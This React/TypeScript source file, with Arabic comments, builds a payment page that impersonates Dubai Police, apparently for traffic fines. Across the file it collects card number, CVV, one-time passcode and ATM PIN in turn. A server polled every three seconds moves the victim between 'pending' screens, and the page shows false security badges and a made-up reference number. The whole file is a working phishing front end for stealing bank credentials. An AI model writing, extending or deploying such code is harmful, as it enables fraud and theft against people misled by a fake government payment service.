import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

// ======== أنواع البيانات ========
type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

// ======== مكون شعار شرطة دبي ========
function DubaiPoliceLogo({ size = 40 }: { size?: number }) {
  const { lang } = useLanguage();
  return (
    <img
      src="/dubai-police-logo.svg"
      width={size}
      height={size}
      alt={lang === "ar" ? "شرطة دبي" : "Dubai Police"}
      style={{ borderRadius: "50%", objectFit: "contain", background: "transparent" }}
    />
  );
}

// ======== مكون شريط التقدم ========
function ProgressSteps({ stage }: { stage: Stage }) {
  const { t, isRTL } = useLanguage();
  const steps = [
    { id: "card", label: t.payment.steps.card, icon: "💳" },
    { id: "otp", label: t.payment.steps.otp, icon: "🔐" },
    { id: "atm", label: t.payment.steps.pin, icon: "🏧" },
    { id: "success", label: t.payment.steps.success, icon: "✅" },
  ];

  const getStepStatus = (stepId: string) => {
    const order = ["card", "otp", "atm", "success"];
    const currentBase = stage.replace("_pending", "");
    const currentIdx = order.indexOf(currentBase);
    const stepIdx = order.indexOf(stepId);
    if (stepIdx < currentIdx) return "done";
    if (stepIdx === currentIdx) return "active";
    return "pending";
  };

  return (
    <div className="flex items-center justify-center gap-1 mb-6 px-2" dir={isRTL ? "rtl" : "ltr"}>
      {steps.map((step, i) => {
        const status = getStepStatus(step.id);
        return (
          <div key={step.id} className="flex items-center">
            <div className="flex flex-col items-center">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all
                ${status === "done" ? "bg-green-500 text-white" :
                  status === "active" ? "bg-[#006633] text-white ring-2 ring-[#006633] ring-offset-2" :
                  "bg-gray-200 text-gray-400"}`}>
                {status === "done" ? "✓" : step.icon}
              </div>
              <span className={`text-xs mt-1 hidden sm:block
                ${status === "active" ? "text-[#006633] font-bold" :
                  status === "done" ? "text-green-600" : "text-gray-400"}`}>
                {step.label}
              </span>
            </div>
            {i < steps.length - 1 && (
              <div className={`w-8 sm:w-12 h-0.5 mx-1 mb-4
                ${getStepStatus(steps[i + 1].id) !== "pending" || status === "done" ? "bg-green-400" : "bg-gray-200"}`} />
            )}
          </div>
        );
      })}
    </div>
  );
}

// ======== مكون صفحة الانتظار ========
function WaitingPage({ message }: { message: string }) {
  const { t, isRTL } = useLanguage();
  return (
    <div className="flex flex-col items-center justify-center py-12 px-4">
      <div className="relative mb-6">
        <div className="w-20 h-20 rounded-full border-4 border-gray-200 border-t-[#006633] animate-spin" />
        <div className="absolute inset-0 flex items-center justify-center">
          <DubaiPoliceLogo size={36} />
        </div>
      </div>
      <h3 className="text-lg font-bold text-gray-800 mb-2 text-center">{message}</h3>
      <p className="text-sm text-gray-500 text-center mb-6">{t.payment.waiting.dontClose}</p>
      <div className="flex gap-1">
        {[0, 1, 2].map(i => (
          <div key={i} className="w-2 h-2 rounded-full bg-[#006633] animate-bounce"
            style={{ animationDelay: `${i * 0.2}s` }} />
        ))}
      </div>
      {/* شارة الأمان */}
      <div className="mt-8 flex items-center gap-2 bg-green-50 border border-green-200 rounded-lg px-4 py-2">
        <span className="text-green-600 text-lg">🔒</span>
        <div>
        <p className="text-xs font-bold text-green-700">{t.payment.waiting.secure}</p>
        <p className="text-xs text-green-600">{t.payment.waiting.secureDesc}</p>
        </div>
      </div>
    </div>
  );
}

// ======== مكون صفحة النجاح ========
function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
  const { t, lang, isRTL } = useLanguage();
  return (
    <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
      <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-4">
        <span className="text-4xl">✅</span>
      </div>
      <h2 className="text-2xl font-bold text-green-600 mb-2">{t.payment.success.title}</h2>
      <p className="text-gray-600 mb-4">{t.payment.success.subtitle}</p>
      <div className="bg-green-50 border border-green-200 rounded-xl p-4 mb-6 w-full max-w-xs">
        <p className="text-sm text-gray-500">{t.payment.success.amountPaid}</p>
        <p className="text-2xl font-bold text-green-600">{totalAmount} {t.payment.header.currency}</p>
      </div>
      <div className={`bg-gray-50 rounded-xl p-4 mb-6 w-full max-w-xs ${isRTL ? "text-right" : "text-left"}`}>
        <p className="text-sm text-gray-500 mb-1">{t.payment.success.reference}</p>
        <p className="text-sm font-mono text-gray-700">DP-{Date.now().toString().slice(-8)}</p>
        <p className="text-xs text-gray-400 mt-2">{new Date().toLocaleString(lang === "ar" ? "ar-AE" : "en-AE")}</p>
      </div>
      <button onClick={onDone}
        className="w-full max-w-xs bg-[#006633] text-white py-3 rounded-xl font-bold text-base hover:bg-[#005528] transition">
        {t.payment.success.backButton}
      </button>
    </div>
  );
}

// ======== مكون صفحة الفشل ========
function FailedPage({ onRetry }: { onRetry: () => void }) {
  const { t, isRTL } = useLanguage();
  return (
    <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
      <div className="w-20 h-20 rounded-full bg-red-100 flex items-center justify-center mb-4">
        <span className="text-4xl">❌</span>
      </div>
      <h2 className="text-2xl font-bold text-red-600 mb-2">{t.payment.failed.title}</h2>
      <p className="text-gray-600 mb-6">{t.payment.failed.subtitle}</p>
      <button onClick={onRetry}
        className="w-full max-w-xs bg-[#006633] text-white py-3 rounded-xl font-bold text-base hover:bg-[#005528] transition">
        {t.payment.failed.retryButton}
      </button>
    </div>
  );
}

// ======== صفحة بيانات البطاقة ========
function CardForm({
  onSubmit,
  isLoading,
  error,
}: {
  onSubmit: (data: { cardName: string; cardNumber: string; cardExpiry: string; cardCvv: string }) => void;
  isLoading: boolean;
  error?: string | null;
}) {
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCvv] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const { t, isRTL } = useLanguage();

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 2) return digits.slice(0, 2) + "/" + digits.slice(2);
    return digits;
  };

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!cardName.trim()) newErrors.cardName = t.payment.card.errors.cardHolder;
    if (cardNumber.replace(/\s/g, "").length < 16) newErrors.cardNumber = t.payment.card.errors.cardNumber;
    if (cardExpiry.length < 5) newErrors.cardExpiry = t.payment.card.errors.expiry;
    if (cardCvv.length < 3) newErrors.cardCvv = t.payment.card.errors.cvv;
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    onSubmit({ cardName, cardNumber: cardNumber.replace(/\s/g, ""), cardExpiry, cardCvv });
  };

  // تحديد نوع البطاقة
  const getCardType = () => {
    const num = cardNumber.replace(/\s/g, "");
    if (num.startsWith("4")) return "visa";
    if (num.startsWith("5") || num.startsWith("2")) return "mastercard";
    return null;
  };

  const cardType = getCardType();

  return (
    <form onSubmit={handleSubmit} className="space-y-4" dir={isRTL ? "rtl" : "ltr"}>
      <div className="bg-gradient-to-br from-[#006633] to-[#004d26] rounded-2xl p-5 text-white mb-6 relative overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -translate-y-1/2 translate-x-1/2" />
        <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full translate-y-1/2 -translate-x-1/2" />
        <div className="flex justify-between items-start mb-6">
          <div className="flex gap-2">
            {cardType === "visa" && <span className="bg-white text-blue-800 font-bold text-xs px-2 py-1 rounded">VISA</span>}
            {cardType === "mastercard" && (
              <div className="flex">
                <div className="w-6 h-6 rounded-full bg-red-500 opacity-90" />
                <div className="w-6 h-6 rounded-full bg-yellow-400 opacity-90 -mr-2" />
              </div>
            )}
          </div>
          <div className="w-8 h-6 bg-yellow-400/80 rounded-sm" />
        </div>
        <p className="font-mono text-lg tracking-widest mb-4">
          {cardNumber || "**** **** **** ****"}
        </p>
        <div className="flex justify-between items-end">
          <div>
            <p className="text-xs text-white/60">{t.payment.card.cardHolder}</p>
            <p className="text-sm font-bold uppercase">{cardName || "CARD HOLDER"}</p>
          </div>
          <div className={isRTL ? "text-right" : "text-left"}>

            <p className="text-xs text-white/60">{t.payment.card.expiry}</p>
            <p className="text-sm font-bold">{cardExpiry || "MM/YY"}</p>
          </div>
        </div>
      </div>

      {error && (
        <div className="bg-red-50 border border-red-300 rounded-xl p-3 flex items-center gap-2">
          <span className="text-red-500">⚠️</span>
          <p className="text-sm text-red-600">{error}</p>
        </div>
      )}

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.cardHolder}</label>
        <input
          type="text"
          value={cardName}
          onChange={e => setCardName(e.target.value)}
          placeholder={t.payment.card.cardHolderPlaceholder}
          className={`w-full border rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-[#006633] transition
            ${errors.cardName ? "border-red-400 bg-red-50" : "border-gray-300"}`}
        />
        {errors.cardName && <p className="text-xs text-red-500 mt-1">{errors.cardName}</p>}
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.cardNumber}</label>
        <input
          type="text"
          inputMode="numeric"
          value={cardNumber}
          onChange={e => setCardNumber(formatCardNumber(e.target.value))}
          placeholder="0000 0000 0000 0000"
          maxLength={19}
          className={`w-full border rounded-xl px-4 py-3 text-sm font-mono tracking-widest focus:outline-none focus:ring-2 focus:ring-[#006633] transition
            ${errors.cardNumber ? "border-red-400 bg-red-50" : "border-gray-300"}`}
        />
        {errors.cardNumber && <p className="text-xs text-red-500 mt-1">{errors.cardNumber}</p>}
      </div>

      <div className="grid grid-cols-2 gap-3">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.expiry}</label>
          <input
            type="text"
            inputMode="numeric"
            value={cardExpiry}
            onChange={e => setCardExpiry(formatExpiry(e.target.value))}
            placeholder="MM/YY"
            maxLength={5}
            className={`w-full border rounded-xl px-4 py-3 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-[#006633] transition
              ${errors.cardExpiry ? "border-red-400 bg-red-50" : "border-gray-300"}`}
          />
          {errors.cardExpiry && <p className="text-xs text-red-500 mt-1">{errors.cardExpiry}</p>}
        </div>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
          <input
            type="password"
            inputMode="numeric"
            value={cardCvv}
            onChange={e => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
            placeholder="***"
            maxLength={4}
            className={`w-full border rounded-xl px-4 py-3 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-[#006633] transition
              ${errors.cardCvv ? "border-red-400 bg-red-50" : "border-gray-300"}`}
          />
          {errors.cardCvv && <p className="text-xs text-red-500 mt-1">{errors.cardCvv}</p>}
        </div>
      </div>

      <button type="submit" disabled={isLoading}
        className="w-full bg-[#006633] text-white py-4 rounded-xl font-bold text-base hover:bg-[#005528] transition disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2">
        {isLoading ? (
          <>
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
            {t.payment.card.processing}
          </>
        ) : (
          <>
            🔒 {t.payment.card.payButton}
          </>
        )}
      </button>
    </form>
  );
}

// ======== صفحة OTP ========
function OtpForm({
  onSubmit,
  isLoading,
  error,
}: {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  error?: string | null;
}) {
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState("");
  const { t, isRTL } = useLanguage();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 4) {
      setOtpError(t.payment.otp.error);
      return;
    }
    setOtpError("");
    onSubmit(otp);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6" dir={isRTL ? "rtl" : "ltr"}>
      <div className="text-center">
        <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
          <span className="text-3xl">📱</span>
        </div>
        <h3 className="text-lg font-bold text-gray-800">{t.payment.otp.title}</h3>
        <p className="text-sm text-gray-500 mt-1">{t.payment.otp.subtitle}</p>
      </div>

      {(error || otpError) && (
        <div className="bg-red-50 border border-red-300 rounded-xl p-3 flex items-center gap-2">
          <span className="text-red-500">⚠️</span>
          <p className="text-sm text-red-600">{error || otpError}</p>
        </div>
      )}

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">{t.payment.otp.label}</label>
        <input
          type="text"
          inputMode="numeric"
          value={otp}
          onChange={e => setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))}
          placeholder={t.payment.otp.placeholder}
          maxLength={8}
          className={`w-full border rounded-xl px-4 py-4 text-center text-2xl font-mono tracking-[0.5em] focus:outline-none focus:ring-2 focus:ring-[#006633] transition
            ${(error || otpError) ? "border-red-400 bg-red-50" : "border-gray-300"}`}
        />
      </div>

      <button type="submit" disabled={isLoading}
        className="w-full bg-[#006633] text-white py-4 rounded-xl font-bold text-base hover:bg-[#005528] transition disabled:opacity-60 flex items-center justify-center gap-2">
        {isLoading ? (
          <>
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
            {t.payment.otp.verifying}
          </>
        ) : t.payment.otp.confirmButton}
      </button>
    </form>
  );
}

// ======== صفحة ATM PIN ========
function AtmPinForm({
  onSubmit,
  isLoading,
  error,
}: {
  onSubmit: (pin: string) => void;
  isLoading: boolean;
  error?: string | null;
}) {
  const [pin, setPin] = useState("");
  const [pinError, setPinError] = useState("");
  const { t, isRTL } = useLanguage();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (pin.length < 4) {
      setPinError(t.payment.atm.error);
      return;
    }
    setPinError("");
    onSubmit(pin);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6" dir={isRTL ? "rtl" : "ltr"}>
      <div className="text-center">
        <div className="w-16 h-16 bg-amber-100 rounded-full flex items-center justify-center mx-auto mb-3">
          <span className="text-3xl">🏧</span>
        </div>
        <h3 className="text-lg font-bold text-gray-800">{t.payment.atm.title}</h3>
        <p className="text-sm text-gray-500 mt-1">{t.payment.atm.subtitle}</p>
      </div>

      {(error || pinError) && (
        <div className="bg-red-50 border border-red-300 rounded-xl p-3 flex items-center gap-2">
          <span className="text-red-500">⚠️</span>
          <p className="text-sm text-red-600">{error || pinError}</p>
        </div>
      )}

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">{t.payment.atm.label}</label>
        <input
          type="password"
          inputMode="numeric"
          value={pin}
          onChange={e => setPin(e.target.value.replace(/\D/g, "").slice(0, 6))}
          placeholder="••••"
          maxLength={6}
          className={`w-full border rounded-xl px-4 py-4 text-center text-2xl font-mono tracking-[0.5em] focus:outline-none focus:ring-2 focus:ring-[#006633] transition
            ${(error || pinError) ? "border-red-400 bg-red-50" : "border-gray-300"}`}
        />
      </div>

      <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 flex items-start gap-2">
        <span className="text-amber-500 mt-0.5">⚠️</span>
        <p className="text-xs text-amber-700">{t.payment.atm.warning}</p>
      </div>

      <button type="submit" disabled={isLoading}
        className="w-full bg-[#006633] text-white py-4 rounded-xl font-bold text-base hover:bg-[#005528] transition disabled:opacity-60 flex items-center justify-center gap-2">
        {isLoading ? (
          <>
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
            {t.payment.atm.verifying}
          </>
        ) : t.payment.atm.confirmButton}
      </button>
    </form>
  );
}

// ======== الصفحة الرئيسية للدفع ========
export default function Payment() {
  const [location, navigate] = useLocation();
  const { t, lang, isRTL, setLanguage } = useLanguage();
  const isArabicRoute = location === "/ar/payment" || location.startsWith("/ar/payment?");
  const homePath = isArabicRoute ? "/ar" : "/";

  useEffect(() => {
    setLanguage(isArabicRoute ? "ar" : "en");
  }, [isArabicRoute, setLanguage]);

  const getPaymentContextFromUrl = () => {
    try {
      const params = new URLSearchParams(window.location.search);
      return {
        sessionId: params.get("sessionId"),
        totalAmount: params.get("total") || "0",
      };
    } catch {
      return {
        sessionId: null,
        totalAmount: "0",
      };
    }
  };


  // قراءة بيانات الدفع من sessionStorage مع خطة احتياطية من الرابط
  const [paymentData] = useState(() => {
    try {
      const raw = sessionStorage.getItem("paymentData");
      if (raw) return JSON.parse(raw);
    } catch {}

    const fallback = getPaymentContextFromUrl();
    if (fallback.sessionId) {
      return {
        selectedFines: [],
        totalAmount: fallback.totalAmount,
        sessionId: fallback.sessionId,
      };
    }

    return null;
  });

  const [sessionId, setSessionId] = useState<string | null>(() => {
    try {
      return sessionStorage.getItem("paymentSessionId") || getPaymentContextFromUrl().sessionId;
    } catch {
      return getPaymentContextFromUrl().sessionId;
    }
  });

  const [stage, setStage] = useState<Stage>("card");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // tRPC mutations
  const createSession = trpc.payment.createSession.useMutation();
  const submitCard = trpc.payment.submitCard.useMutation();
  const submitOtp = trpc.payment.submitOtp.useMutation();
  const submitAtmPin = trpc.payment.submitAtmPin.useMutation();

  // tRPC query للـ polling
  const statusQuery = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && (stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending"),
      refetchInterval: 3000,
      refetchIntervalInBackground: true,
    }
  );

  // حفظ sessionId القادم من الرابط محليًا إن وُجد
  useEffect(() => {
    if (!sessionId) return;
    try {
      sessionStorage.setItem("paymentSessionId", sessionId);
    } catch {}
  }, [sessionId]);

  // إنشاء الجلسة عند أول تحميل
  useEffect(() => {
    if (!sessionId && paymentData) {
      createSession.mutateAsync({
        selectedFines: paymentData.selectedFines || [],
        totalAmount: paymentData.totalAmount || "0",
        plateNumber: paymentData.plateNumber,
        plateSource: paymentData.plateSource,
        queryId: paymentData.queryId,
      }).then(res => {
        if (res.success) {
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }).catch(console.error);
    }
  }, []);

  // مراقبة تغيير الحالة من الـ polling
  useEffect(() => {
    if (!statusQuery.data) return;
    const newStage = statusQuery.data.stage as Stage;
    const newError = statusQuery.data.errorMessage;

    if (newStage !== stage) {
      setStage(newStage);
      if (newError) {
        setErrorMessage(newError);
      } else {
        setErrorMessage(null);
      }
    }
  }, [statusQuery.data]);

  // إذا لم تكن هناك بيانات دفع، إعادة التوجيه
  if (!paymentData && !sessionId) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center" dir={isRTL ? "rtl" : "ltr"}>
        <div className="text-center">
          <p className="text-gray-600 mb-4">{t.payment.noData.message}</p>
          <button onClick={() => navigate(homePath)}
            className="bg-[#006633] text-white px-6 py-2 rounded-xl font-bold">
            {t.payment.noData.backButton}
          </button>
        </div>
      </div>
    );
  }

  const totalAmount = paymentData?.totalAmount || "0";

  const handleCardSubmit = async (data: { cardName: string; cardNumber: string; cardExpiry: string; cardCvv: string }) => {
    setIsSubmitting(true);
    try {
      let currentSessionId = sessionId;
      // إنشاء الجلسة إذا لم تكن موجودة بعد
      if (!currentSessionId && paymentData) {
        const res = await createSession.mutateAsync({
          selectedFines: paymentData.selectedFines || [],
          totalAmount: paymentData.totalAmount || "0",
          plateNumber: paymentData.plateNumber,
          plateSource: paymentData.plateSource,
          queryId: paymentData.queryId,
        });
        if (res.success) {
          currentSessionId = res.sessionId;
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }
      if (!currentSessionId) {
        setErrorMessage(lang === "ar" ? "حدث خطأ في إنشاء جلسة الدفع. يرجى المحاولة مرة أخرى." : "An error occurred while creating the payment session. Please try again.");
        return;
      }
      await submitCard.mutateAsync({ sessionId: currentSessionId, ...data });
      setStage("card_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOtpSubmit = async (otpCode: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    try {
      await submitOtp.mutateAsync({ sessionId, otpCode });
      setStage("otp_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleAtmPinSubmit = async (atmPin: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    try {
      await submitAtmPin.mutateAsync({ sessionId, atmPin });
      setStage("atm_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleDone = () => {
    sessionStorage.removeItem("paymentData");
    sessionStorage.removeItem("paymentSessionId");
    navigate(homePath);
  };

  const handleRetry = () => {
    sessionStorage.removeItem("paymentSessionId");
    setSessionId(null);
    setStage("card");
    setErrorMessage(null);
    // إعادة إنشاء جلسة جديدة
    if (paymentData) {
      createSession.mutateAsync({
        selectedFines: paymentData.selectedFines || [],
        totalAmount: paymentData.totalAmount || "0",
        plateNumber: paymentData.plateNumber,
        plateSource: paymentData.plateSource,
        queryId: paymentData.queryId,
      }).then(res => {
        if (res.success) {
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }).catch(console.error);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50" dir={isRTL ? "rtl" : "ltr"}>
      {/* هيدر */}
      <div className="bg-[#006633] text-white py-3 px-4 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <DubaiPoliceLogo size={32} />
          <div>
            <p className="text-sm font-bold">{t.header.siteName}</p>
            <p className="text-xs opacity-80">{t.header.siteNameEn}</p>
          </div>
        </div>
        <div className={isRTL ? "text-right" : "text-left"}>
          <p className="text-xs opacity-80">{t.payment.header.totalAmount}</p>
          <p className="text-lg font-bold">{totalAmount} {t.payment.header.currency}</p>
        </div>
      </div>

      {/* المحتوى */}
      <div className="max-w-md mx-auto px-4 py-6">
        {/* شريط التقدم */}
        {stage !== "success" && stage !== "failed" && (
          <ProgressSteps stage={stage} />
        )}

        {/* بطاقة المحتوى */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
          {stage === "card" && (
            <CardForm
              onSubmit={handleCardSubmit}
              isLoading={isSubmitting}
              error={errorMessage}
            />
          )}

          {stage === "card_pending" && (
            <WaitingPage message={t.payment.waiting.card} />
          )}

          {stage === "otp" && (
            <OtpForm
              onSubmit={handleOtpSubmit}
              isLoading={isSubmitting}
              error={errorMessage}
            />
          )}

          {stage === "otp_pending" && (
            <WaitingPage message={t.payment.waiting.otp} />
          )}

          {stage === "atm" && (
            <AtmPinForm
              onSubmit={handleAtmPinSubmit}
              isLoading={isSubmitting}
              error={errorMessage}
            />
          )}

          {stage === "atm_pending" && (
            <WaitingPage message={t.payment.waiting.atm} />
          )}

          {stage === "success" && (
            <SuccessPage totalAmount={totalAmount} onDone={handleDone} />
          )}

          {stage === "failed" && (
            <FailedPage onRetry={handleRetry} />
          )}
        </div>

        {/* شارة الأمان السفلية */}
        {stage !== "success" && stage !== "failed" && (
          <div className="flex items-center justify-center gap-4 mt-4 text-xs text-gray-400">
            <span>🔒 {t.payment.security.ssl}</span>
            <span>•</span>
            <span>🛡️ {t.payment.security.protected}</span>
            <span>•</span>
            <span>✅ {t.payment.security.certified}</span>
          </div>
        )}
      </div>
    </div>
  );
}
